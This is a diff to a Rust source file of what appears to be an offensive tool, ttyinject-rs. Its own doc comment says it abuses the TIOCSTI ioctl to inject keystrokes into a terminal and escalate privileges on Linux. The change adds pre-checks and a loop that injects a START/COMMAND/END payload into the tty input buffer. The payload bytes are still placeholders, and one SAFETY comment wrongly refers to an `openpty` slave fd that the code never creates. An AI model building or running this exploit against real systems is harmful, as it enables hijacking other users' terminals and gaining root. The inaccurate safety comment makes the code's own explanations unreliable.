@@ -3,10 +3,17 @@
 #![cfg_attr(doc, doc = include_str!("../README.md"))]
 #![doc(html_logo_url = "https://raw.githubusercontent.com/0xdea/ttyinject-rs/master/.img/logo.png")]
 
-use std::{io, thread, time};
+use std::io;
 
 use anyhow::Context as _;
-use libc::{STDIN_FILENO, TIOCSTI, c_int, ioctl};
+use libc::{STDIN_FILENO, TIOCSTI, c_int, getuid, ioctl, isatty, ttyname_r};
+
+/// First part of the payload to inject into the tty's input buffer.
+const START: &[u8] = b"start\n";
+/// The command to execute after the payload has been injected.
+const COMMAND: &[u8] = b"command";
+/// End part of the payload to inject into the tty's input buffer.
+const END: &[u8] = b";end\n";
 
 /// Abuses the `TIOCSTI` ioctl to inject keystrokes into a terminal to escalate privileges on Linux.
 ///
@@ -14,8 +21,51 @@ use libc::{STDIN_FILENO, TIOCSTI, c_int, ioctl};
 ///
 /// Returns an [`anyhow::Error`] if the `TIOCSTI` ioctl fails.
 pub fn run() -> anyhow::Result<()> {
-    tiocsti_inject(STDIN_FILENO, b'X').context("failed to inject into tty")?;
-    thread::sleep(time::Duration::from_secs(2));
+    // SAFETY: getuid() is safe to call
+    let uid = unsafe { getuid() };
+    if uid == 0 {
+        anyhow::bail!("we are already root");
+    }
+    // SAFETY: isatty() is safe to call
+    if unsafe { isatty(STDIN_FILENO) == 0 } {
+        anyhow::bail!("stdin does not refer to a terminal");
+    }
+
+    // SAFETY: getppid() is safe to call
+    let parent_pid = unsafe { libc::getppid() };
+    if parent_pid <= 1 {
+        anyhow::bail!("invalid parent process id");
+    }
+
+    let mut path_buf = [0_u8; 64];
+    // SAFETY: `slave` is a valid, open pty fd from `openpty` above; `path_buf` is a live,
+    // writable buffer whose length is passed accurately, which is large enough for any
+    // `/dev/pts/N` path.
+    let ttyname_ret =
+        unsafe { ttyname_r(STDIN_FILENO, path_buf.as_mut_ptr().cast(), path_buf.len()) };
+    if ttyname_ret != 0 {
+        anyhow::bail!(
+            "ttyname_r failed: {}",
+            io::Error::from_raw_os_error(ttyname_ret)
+        );
+    }
+
+    // TODO: stat + uid check
+    // TODO: use rust-native functions instead of unsafe libc calls where possible
+
+    for &b in START {
+        tiocsti_inject(STDIN_FILENO, b).context("failed to inject into tty")?;
+    }
+    for &b in COMMAND {
+        tiocsti_inject(STDIN_FILENO, b).context("failed to inject into tty")?;
+    }
+    for &b in END {
+        tiocsti_inject(STDIN_FILENO, b).context("failed to inject into tty")?;
+    }
+
+    // tiocsti_inject(STDIN_FILENO, b'X').context("failed to inject into tty")?;
+    // thread::sleep(time::Duration::from_secs(2));
+
     Ok(())
 }
 
